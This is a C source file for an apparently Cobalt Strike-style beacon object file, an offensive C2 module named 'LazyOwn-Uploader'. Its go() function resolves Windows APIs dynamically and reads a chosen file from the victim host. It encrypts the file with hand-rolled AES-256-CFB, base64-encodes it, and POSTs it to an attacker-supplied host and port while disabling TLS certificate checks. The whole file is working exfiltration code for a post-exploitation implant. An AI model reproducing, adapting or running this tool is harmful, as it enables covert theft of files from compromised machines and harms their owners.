#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "beacon.h"

// ================================
// IMPORTS DIRECTOS
// ================================
extern PVOID __imp_LoadLibraryA;
extern PVOID __imp_GetProcAddress;

// ================================
// TIPOS MANUALES
// ================================
typedef unsigned char uint8_t;
typedef unsigned int uint32_t;
typedef void* HINTERNET;
typedef WORD INTERNET_PORT;

typedef ULONG_PTR HCRYPTPROV;
#define PROV_RSA_AES 24
#define CRYPT_VERIFYCONTEXT 0xF0000000

#define AES_BLOCKLEN 16
#define AES256_KEYLEN 32
#define Nr 14
#define Nk 8
#define Nb 4

#define SECURITY_FLAG_IGNORE_UNKNOWN_CA          0x00000100
#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID     0x00001000
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID   0x00002000
#define WINHTTP_OPTION_SECURITY_FLAGS 31

#ifndef WINHTTP_ACCESS_TYPE_NO_PROXY
#define WINHTTP_ACCESS_TYPE_NO_PROXY 1
#endif

#ifndef WINHTTP_NO_PROXY_NAME
#define WINHTTP_NO_PROXY_NAME ((LPCWSTR)NULL)
#endif

#ifndef WINHTTP_NO_PROXY_BYPASS
#define WINHTTP_NO_PROXY_BYPASS ((LPCWSTR)NULL)
#endif

typedef struct {
    uint8_t RoundKey[240];
} AES_ctx;

// ================================
// FUNCIONES AUXILIARES
// ================================
static int my_strlen(const char *s) {
    int len = 0;
    if (s) while (*s++) len++;
    return len;
}

static void* my_memcpy(void* dst, const void* src, size_t len) {
    char* d = (char*)dst;
    const char* s = (const char*)src;
    while (len--) *d++ = *s++;
    return dst;
}

static void* my_memset(void* dst, int val, size_t len) {
    char* d = (char*)dst;
    while (len--) *d++ = (char)val;
    return dst;
}

static BOOL my_contains_dotdot(const char* path) {
    if (!path) return TRUE;
    int len = my_strlen(path);
    for (int i = 0; i < len - 1; i++) {
        if (path[i] == '.' && path[i+1] == '.') return TRUE;
    }
    return FALSE;
}

static char* my_strchr(const char *s, int c)
{
    while (*s) {
        if (*s == (char)c) return (char*)s;
        s++;
    }
    return (char*)((c == 0) ? s : NULL);
}

// ================================
// AES (sin datos globales)
// ================================
static uint8_t xtime(uint8_t x) {
    return ((x << 1) ^ (((x >> 7) & 1) * 0x1b));
}

typedef uint8_t state_t[4][4];

static void AddRoundKey(uint8_t round, state_t* state, const uint8_t* RoundKey) {
    uint8_t i, j;
    for (i = 0; i < 4; ++i)
        for (j = 0; j < 4; ++j)
            (*state)[i][j] ^= RoundKey[(round * Nb * 4) + (i * Nb) + j];
}

static void SubBytes(state_t* state, const uint8_t* sbox) {
    uint8_t i, j;
    for (i = 0; i < 4; ++i)
        for (j = 0; j < 4; ++j)
            (*state)[j][i] = sbox[(*state)[j][i]];
}

static void ShiftRows(state_t* state) {
    uint8_t temp;
    temp = (*state)[0][1]; (*state)[0][1] = (*state)[1][1]; (*state)[1][1] = (*state)[2][1]; (*state)[2][1] = (*state)[3][1]; (*state)[3][1] = temp;
    temp = (*state)[0][2]; (*state)[0][2] = (*state)[2][2]; (*state)[2][2] = temp;
    temp = (*state)[1][2]; (*state)[1][2] = (*state)[3][2]; (*state)[3][2] = temp;
    temp = (*state)[0][3]; (*state)[0][3] = (*state)[3][3]; (*state)[3][3] = (*state)[2][3]; (*state)[2][3] = (*state)[1][3]; (*state)[1][3] = temp;
}

static void MixColumns(state_t* state) {
    uint8_t i, Tmp, Tm, t;
    for (i = 0; i < 4; ++i) {
        t = (*state)[i][0];
        Tmp = (*state)[i][0] ^ (*state)[i][1] ^ (*state)[i][2] ^ (*state)[i][3];
        Tm = (*state)[i][0] ^ (*state)[i][1]; Tm = xtime(Tm); (*state)[i][0] ^= Tm ^ Tmp;
        Tm = (*state)[i][1] ^ (*state)[i][2]; Tm = xtime(Tm); (*state)[i][1] ^= Tm ^ Tmp;
        Tm = (*state)[i][2] ^ (*state)[i][3]; Tm = xtime(Tm); (*state)[i][2] ^= Tm ^ Tmp;
        Tm = (*state)[i][3] ^ t; Tm = xtime(Tm); (*state)[i][3] ^= Tm ^ Tmp;
    }
}

static void Cipher(state_t* state, const uint8_t* RoundKey, const uint8_t* sbox) {
    uint8_t round = 0;
    AddRoundKey(0, state, RoundKey);
    for (round = 1; ; ++round) {
        SubBytes(state, sbox);
        ShiftRows(state);
        if (round == Nr) break;
        MixColumns(state);
        AddRoundKey(round, state, RoundKey);
    }
    AddRoundKey(Nr, state, RoundKey);
}

static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key, const uint8_t* sbox, const uint8_t* Rcon) {
    unsigned i, j, k;
    uint8_t tempa[4];
    for (i = 0; i < Nk; ++i)
        for (j = 0; j < 4; ++j)
            RoundKey[(i * 4) + j] = Key[(i * 4) + j];

    for (i = Nk; i < Nb * (Nr + 1); ++i) {
        k = (i - 1) * 4;
        tempa[0] = RoundKey[k + 0]; tempa[1] = RoundKey[k + 1]; tempa[2] = RoundKey[k + 2]; tempa[3] = RoundKey[k + 3];

        if (i % Nk == 0) {
            const uint8_t u8tmp = tempa[0];
            tempa[0] = tempa[1]; tempa[1] = tempa[2]; tempa[2] = tempa[3]; tempa[3] = u8tmp;
            tempa[0] = sbox[tempa[0]]; tempa[1] = sbox[tempa[1]]; tempa[2] = sbox[tempa[2]]; tempa[3] = sbox[tempa[3]];
            tempa[0] ^= Rcon[i / Nk];
        }
        if (i % Nk == 4) {
            tempa[0] = sbox[tempa[0]]; tempa[1] = sbox[tempa[1]]; tempa[2] = sbox[tempa[2]]; tempa[3] = sbox[tempa[3]];
        }
        j = i * 4; k = (i - Nk) * 4;
        RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];
        RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];
        RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2];
        RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3];
    }
}

void AES_init_ctx(AES_ctx* ctx, const uint8_t* key, const uint8_t* sbox, const uint8_t* Rcon) {
    KeyExpansion(ctx->RoundKey, key, sbox, Rcon);
}

void AES_CFB_encrypt_buffer(AES_ctx* ctx, uint8_t* iv, uint8_t* buf, uint32_t length, const uint8_t* sbox) {
    uint32_t i = 0;
    uint8_t feedback[16];
    uint8_t keystream[16];

    my_memcpy(feedback, iv, 16);

    while (i < length) {
        my_memcpy(keystream, feedback, 16);
        Cipher((state_t*)keystream, ctx->RoundKey, sbox);

        uint32_t block_size = (length - i > 16) ? 16 : (length - i);
        for (uint32_t j = 0; j < block_size; ++j) {
            buf[i + j] ^= keystream[j];
        }

        my_memcpy(feedback, &buf[i], block_size);
        if (block_size < 16) {
            my_memset(&feedback[block_size], 0, 16 - block_size);
        }
        i += block_size;
    }
}

// ================================
// BASE64
// ================================
static char* my_base64_encode(const uint8_t* data, uint32_t len,
    LPVOID (WINAPI *pVirtualAlloc_fn)(LPVOID, SIZE_T, DWORD, DWORD),
    BOOL (WINAPI *pVirtualFree_fn)(LPVOID, SIZE_T, DWORD)) {
    if (!data || len == 0) return NULL;

    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    uint32_t out_len = 4 * ((len + 2) / 3);
    char* out = (char*)pVirtualAlloc_fn(NULL, out_len + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!out) return NULL;

    uint32_t i = 0, j = 0;
    while (i < len) {
        uint32_t octet_a = i < len ? data[i++] : 0;
        uint32_t octet_b = i < len ? data[i++] : 0;
        uint32_t octet_c = i < len ? data[i++] : 0;
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        out[j++] = b64[(triple >> 3 * 6) & 0x3F];
        out[j++] = b64[(triple >> 2 * 6) & 0x3F];
        out[j++] = (i <= len + 1) ? b64[(triple >> 1 * 6) & 0x3F] : '=';
        out[j++] = (i <= len)     ? b64[(triple >> 0 * 6) & 0x3F] : '=';
    }
    out[j] = '\0';
    return out;
}

static void ParseUploadArgs(const char* args, int alen,
                            char* local_path, char* host, int* port,
                            char* endpoint, char* aes_key_hex)
{
    /* copia local garantizada con 0-final */
    char buf[512];
    int  max = (alen >= sizeof(buf)-1) ? sizeof(buf)-1 : alen;
    my_memcpy(buf, args, max);
    
    buf[max] = 0;

    /* campos */
    char *p = buf, *next;
    #define NEXT_TOKEN(dst,lim) do{                                          \
        next = my_strchr(p, '/');                                            \
        if (!next) return;       /* formato inválido */                      \
        int len = (int)(next - p);                                           \
        if (len >= (lim)) return;/* campo demasiado largo */                 \
        my_memcpy(dst, p, len); dst[len] = 0;                                \
        p = next + 1;                                                        \
    }while(0)

    NEXT_TOKEN(local_path, 128);
    NEXT_TOKEN(host,      64);
    /* puerto es numérico */
    char tmp[16]; NEXT_TOKEN(tmp,16);
    *port = 0;
    for (char *c = tmp; *c; c++){
        if (*c < '0' || *c > '9') return;
        *port = *port*10 + (*c - '0');
    }
    NEXT_TOKEN(endpoint,  64);
    /* lo que queda es la clave */
    int klen = my_strlen(p);
    if (klen != 64) return;
    my_memcpy(aes_key_hex, p, 64);
    aes_key_hex[64] = 0;
}

// ================================
// FUNCIÓN PRINCIPAL
// ================================
void go(char *args, int alen) {
    // === TABLAS AES EN STACK ===
    uint8_t sbox[256] = {
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
    };

    uint8_t Rcon[11] = {
        0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
    };

    HMODULE (WINAPI *pLoadLibraryA)(LPCSTR) = (HMODULE(WINAPI*)(LPCSTR))__imp_LoadLibraryA;
    FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR) = (FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress;

    if (!pLoadLibraryA || !pGetProcAddress) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló resolución de loader\n");
        return;
    }

    HMODULE hKernel32 = pLoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = pLoadLibraryA("advapi32.dll");
    HMODULE hWinHttp = pLoadLibraryA("winhttp.dll");

    if (!hKernel32 || !hAdvapi32 || !hWinHttp) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló carga de DLLs\n");
        return;
    }

    typedef LPVOID (WINAPI *t_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI *t_VirtualFree)(LPVOID, SIZE_T, DWORD);
    t_VirtualAlloc pVirtualAlloc = (t_VirtualAlloc)pGetProcAddress(hKernel32, "VirtualAlloc");
    t_VirtualFree pVirtualFree = (t_VirtualFree)pGetProcAddress(hKernel32, "VirtualFree");

    if (!pVirtualAlloc || !pVirtualFree) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló resolución de VirtualAlloc/Free\n");
        return;
    }

    // === PARSEO SEGURO CON "/" ===
    char local_path[128] = {0};
    char host[64] = {0};
    int port = 0;
    char endpoint[64] = {0};
    char aes_key_hex[65] = {0};

    ParseUploadArgs(args, alen, local_path, host, &port, endpoint, aes_key_hex);

    // validar longitud de clave
    int key_len = my_strlen(aes_key_hex);
    if (key_len != 64) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Clave AES debe ser 64 caracteres hex (actual: %d)\n", key_len);
        return;
    }

    // validar puerto
    if (port <= 0 || port > 65535) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Puerto fuera de rango\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][+] Iniciando subida de archivo...\n");
    if (my_contains_dotdot(local_path)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Path traversal detectado\n");
        return;
    }

    // Resolución de APIs
    typedef HANDLE (WINAPI *t_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    typedef BOOL (WINAPI *t_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    typedef BOOL (WINAPI *t_GetFileSizeEx)(HANDLE, PLARGE_INTEGER);
    typedef BOOL (WINAPI *t_CloseHandle)(HANDLE);
    typedef int (WINAPI *t_MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
    typedef BOOL (WINAPI *t_WinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
    typedef BOOL (WINAPI *t_WinHttpSetTimeouts)(HINTERNET, int, int, int, int);

    t_CreateFileA pCreateFileA = (t_CreateFileA)pGetProcAddress(hKernel32, "CreateFileA");
    t_ReadFile pReadFile = (t_ReadFile)pGetProcAddress(hKernel32, "ReadFile");
    t_GetFileSizeEx pGetFileSizeEx = (t_GetFileSizeEx)pGetProcAddress(hKernel32, "GetFileSizeEx");
    t_CloseHandle pCloseHandle = (t_CloseHandle)pGetProcAddress(hKernel32, "CloseHandle");
    t_MultiByteToWideChar pMultiByteToWideChar = (t_MultiByteToWideChar)pGetProcAddress(hKernel32, "MultiByteToWideChar");
    t_WinHttpSetOption pWinHttpSetOption = (t_WinHttpSetOption)pGetProcAddress(hWinHttp, "WinHttpSetOption");
    t_WinHttpSetTimeouts pWinHttpSetTimeouts = (t_WinHttpSetTimeouts)pGetProcAddress(hWinHttp, "WinHttpSetTimeouts");

    typedef BOOL (WINAPI *t_CryptAcquireContextA)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);
    typedef BOOL (WINAPI *t_CryptGenRandom)(HCRYPTPROV, DWORD, BYTE*);
    typedef BOOL (WINAPI *t_CryptReleaseContext)(HCRYPTPROV, DWORD);
    t_CryptAcquireContextA pCryptAcquireContextA = (t_CryptAcquireContextA)pGetProcAddress(hAdvapi32, "CryptAcquireContextA");
    t_CryptGenRandom pCryptGenRandom = (t_CryptGenRandom)pGetProcAddress(hAdvapi32, "CryptGenRandom");
    t_CryptReleaseContext pCryptReleaseContext = (t_CryptReleaseContext)pGetProcAddress(hAdvapi32, "CryptReleaseContext");

    typedef HINTERNET (WINAPI *t_WinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    typedef HINTERNET (WINAPI *t_WinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    typedef HINTERNET (WINAPI *t_WinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    typedef BOOL (WINAPI *t_WinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI *t_WinHttpWriteData)(HINTERNET, LPCVOID, DWORD, LPDWORD, DWORD);
    typedef BOOL (WINAPI *t_WinHttpCloseHandle)(HINTERNET);
    t_WinHttpOpen pWinHttpOpen = (t_WinHttpOpen)pGetProcAddress(hWinHttp, "WinHttpOpen");
    t_WinHttpConnect pWinHttpConnect = (t_WinHttpConnect)pGetProcAddress(hWinHttp, "WinHttpConnect");
    t_WinHttpOpenRequest pWinHttpOpenRequest = (t_WinHttpOpenRequest)pGetProcAddress(hWinHttp, "WinHttpOpenRequest");
    t_WinHttpSendRequest pWinHttpSendRequest = (t_WinHttpSendRequest)pGetProcAddress(hWinHttp, "WinHttpSendRequest");
    t_WinHttpWriteData pWinHttpWriteData = (t_WinHttpWriteData)pGetProcAddress(hWinHttp, "WinHttpWriteData");
    t_WinHttpCloseHandle pWinHttpCloseHandle = (t_WinHttpCloseHandle)pGetProcAddress(hWinHttp, "WinHttpCloseHandle");

    if (!pCreateFileA || !pReadFile || !pGetFileSizeEx || !pVirtualAlloc || !pVirtualFree ||
        !pCloseHandle || !pMultiByteToWideChar || !pCryptAcquireContextA || !pCryptGenRandom ||
        !pCryptReleaseContext || !pWinHttpOpen || !pWinHttpConnect || !pWinHttpOpenRequest ||
        !pWinHttpSendRequest || !pWinHttpWriteData || !pWinHttpCloseHandle) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló resolución de APIs\n");
        goto cleanup;
    }

    // Convertir clave hex a binario
    uint8_t aes_key_bin[32] = {0};
    for (int i = 0; i < 64; i += 2) {
        char hex_byte[3] = {aes_key_hex[i], aes_key_hex[i+1], '\0'};
        uint8_t val = 0;
        for (int j = 0; j < 2; j++) {
            char c = hex_byte[j];
            if (c >= '0' && c <= '9') val = val * 16 + (c - '0');
            else if (c >= 'a' && c <= 'f') val = val * 16 + (c - 'a' + 10);
            else if (c >= 'A' && c <= 'F') val = val * 16 + (c - 'A' + 10);
        }
        aes_key_bin[i/2] = val;
    }

    // Leer archivo
    HANDLE hFile = pCreateFileA(local_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] No se pudo abrir el archivo: %s\n", local_path);
        goto cleanup;
    }

    LARGE_INTEGER fileSize = {0};
    if (!pGetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart <= 0 || fileSize.QuadPart > (10 * 1024 * 1024)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Archivo inválido o demasiado grande\n");
        pCloseHandle(hFile);
        goto cleanup;
    }

    SIZE_T bufSize = (SIZE_T)fileSize.QuadPart;
    char* fileBuffer = (char*)pVirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!fileBuffer) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló asignación de memoria\n");
        pCloseHandle(hFile);
        goto cleanup;
    }

    DWORD bytesRead = 0;
    if (!pReadFile(hFile, fileBuffer, (DWORD)bufSize, &bytesRead, NULL) || bytesRead != bufSize) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló lectura del archivo\n");
        pCloseHandle(hFile);
        pVirtualFree(fileBuffer, 0, MEM_RELEASE);
        goto cleanup;
    }
    pCloseHandle(hFile);

    // Cifrar
    SIZE_T total_size = 16 + bufSize;
    uint8_t* encryptBuffer = (uint8_t*)pVirtualAlloc(NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!encryptBuffer) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló buffer de cifrado\n");
        pVirtualFree(fileBuffer, 0, MEM_RELEASE);
        goto cleanup;
    }

    HCRYPTPROV hProv = 0;
    if (!pCryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) ||
        !pCryptGenRandom(hProv, 16, encryptBuffer)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló generación de IV\n");
        if (hProv) pCryptReleaseContext(hProv, 0);
        pVirtualFree(encryptBuffer, 0, MEM_RELEASE);
        pVirtualFree(fileBuffer, 0, MEM_RELEASE);
        goto cleanup;
    }
    if (hProv) pCryptReleaseContext(hProv, 0);

    my_memcpy(encryptBuffer + 16, fileBuffer, bufSize);
    pVirtualFree(fileBuffer, 0, MEM_RELEASE);

    AES_ctx ctx;
    AES_init_ctx(&ctx, aes_key_bin, sbox, Rcon);
    AES_CFB_encrypt_buffer(&ctx, encryptBuffer, encryptBuffer + 16, (uint32_t)bufSize, sbox);

    // Codificar en base64
    char* b64 = my_base64_encode(encryptBuffer, (uint32_t)total_size, pVirtualAlloc, pVirtualFree);
    my_memset(encryptBuffer, 0, total_size);
    pVirtualFree(encryptBuffer, 0, MEM_RELEASE);

    if (!b64) {
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló codificación base64\n");
        goto cleanup;
    }

    // Convertir host y endpoint a wchar_t
    int host_len = my_strlen(host) + 1;
    wchar_t* w_host = (wchar_t*)pVirtualAlloc(NULL, host_len * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!w_host) {
        my_memset(b64, 0, my_strlen(b64));
        pVirtualFree(b64, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló conversión de host\n");
        goto cleanup;
    }
    pMultiByteToWideChar(CP_UTF8, 0, host, -1, w_host, host_len);

    int ep_len = my_strlen(endpoint) + 1;
    wchar_t* w_endpoint = (wchar_t*)pVirtualAlloc(NULL, ep_len * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!w_endpoint) {
        my_memset(b64, 0, my_strlen(b64));
        pVirtualFree(b64, 0, MEM_RELEASE);
        pVirtualFree(w_host, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló conversión de endpoint\n");
        goto cleanup;
    }
    pMultiByteToWideChar(CP_UTF8, 0, endpoint, -1, w_endpoint, ep_len);

    // Subir
    DWORD flags = 0x00800000;
    HINTERNET hSession = pWinHttpOpen(L"LazyOwn-Uploader/1.0", 0, NULL, NULL, 0);
    if (!hSession) {
        my_memset(b64, 0, my_strlen(b64));
        pVirtualFree(b64, 0, MEM_RELEASE);
        pVirtualFree(w_host, 0, MEM_RELEASE);
        pVirtualFree(w_endpoint, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló WinHttpOpen\n");
        goto cleanup;
    }

    HINTERNET hConnect = pWinHttpConnect(hSession, w_host, (INTERNET_PORT)port, 0);
    if (!hConnect) {
        pWinHttpCloseHandle(hSession);
        my_memset(b64, 0, my_strlen(b64));
        pVirtualFree(b64, 0, MEM_RELEASE);
        pVirtualFree(w_host, 0, MEM_RELEASE);
        pVirtualFree(w_endpoint, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló WinHttpConnect\n");
        goto cleanup;
    }

    HINTERNET hRequest = pWinHttpOpenRequest(hConnect, L"POST", w_endpoint, NULL, NULL, NULL, flags);
    
    if (flags & 0x00800000) { // HTTPS
        DWORD dwOption = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        if (!pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwOption, sizeof(dwOption))) {
            BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][!] WinHttpSetOption falló (ignorar cert)\n");
            // No fallamos aquí, seguimos intentando
        }
    }    
    if (!hRequest) {
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        my_memset(b64, 0, my_strlen(b64));
        pVirtualFree(b64, 0, MEM_RELEASE);
        pVirtualFree(w_host, 0, MEM_RELEASE);
        pVirtualFree(w_endpoint, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló WinHttpOpenRequest\n");
        goto cleanup;
    }

    DWORD b64_len = my_strlen(b64);
    if (!pWinHttpSendRequest(hRequest, L"Content-Type: application/octet-stream\r\n", -1, NULL, 0, b64_len, 0)) {
        pWinHttpCloseHandle(hRequest);
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        my_memset(b64, 0, b64_len);
        pVirtualFree(b64, 0, MEM_RELEASE);
        pVirtualFree(w_host, 0, MEM_RELEASE);
        pVirtualFree(w_endpoint, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló WinHttpSendRequest\n");
        goto cleanup;
    }

    DWORD bytesWritten = 0;
    if (!pWinHttpWriteData(hRequest, b64, b64_len, &bytesWritten, 0) || bytesWritten != b64_len) {
        pWinHttpCloseHandle(hRequest);
        pWinHttpCloseHandle(hConnect);
        pWinHttpCloseHandle(hSession);
        my_memset(b64, 0, b64_len);
        pVirtualFree(b64, 0, MEM_RELEASE);
        pVirtualFree(w_host, 0, MEM_RELEASE);
        pVirtualFree(w_endpoint, 0, MEM_RELEASE);
        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló WinHttpWriteData\n");
        goto cleanup;
    }

    pWinHttpCloseHandle(hRequest);
    pWinHttpCloseHandle(hConnect);
    pWinHttpCloseHandle(hSession);
    my_memset(b64, 0, b64_len);
    pVirtualFree(b64, 0, MEM_RELEASE);
    pVirtualFree(w_host, 0, MEM_RELEASE);
    pVirtualFree(w_endpoint, 0, MEM_RELEASE);

    BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][+] Archivo subido exitosamente\n");

cleanup:
    typedef BOOL (WINAPI *t_FreeLibrary)(HMODULE);
    t_FreeLibrary pFreeLibrary = (t_FreeLibrary)pGetProcAddress(hKernel32, "FreeLibrary");
    if (pFreeLibrary) {
        if (hWinHttp) pFreeLibrary(hWinHttp);
        if (hAdvapi32) pFreeLibrary(hAdvapi32);
        if (hKernel32) pFreeLibrary(hKernel32);
    }
}